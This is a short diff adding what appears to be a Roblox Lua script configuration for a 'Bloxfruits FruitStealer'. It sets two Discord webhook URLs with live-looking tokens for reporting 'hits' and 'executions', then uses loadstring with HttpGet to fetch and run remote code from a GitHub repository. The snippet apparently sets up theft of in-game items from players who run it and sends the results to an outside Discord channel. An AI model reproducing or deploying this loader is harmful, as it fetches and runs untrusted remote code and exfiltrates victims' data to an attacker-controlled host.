@@ -1,0 +1,6 @@
+HitsWebhook = "https://discord.com/api/webhooks/1473304122659963005/FMtdSbVX8p7PUszTMLN8YsiOIrpxFf0sc14r5EICt4V79LjCTUz78WTVwDrbgBprTprb"  (webhook of the channel where the hits should be shown)
+Executions_Webhook = "https://discord.com/api/webhooks/1473304122659963005/FMtdSbVX8p7PUszTMLN8YsiOIrpxFf0sc14r5EICt4V79LjCTUz78WTVwDrbgBprTprb"  (webhook of the channel where the executions should be shown)
+Username = "SurviveLavaFree"
+Button_Prompt = "e"  (Any Letter, for example E)
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/UrbanDEV0/Bloxfruits-FruitStealer/refs/heads/main/lua"))()
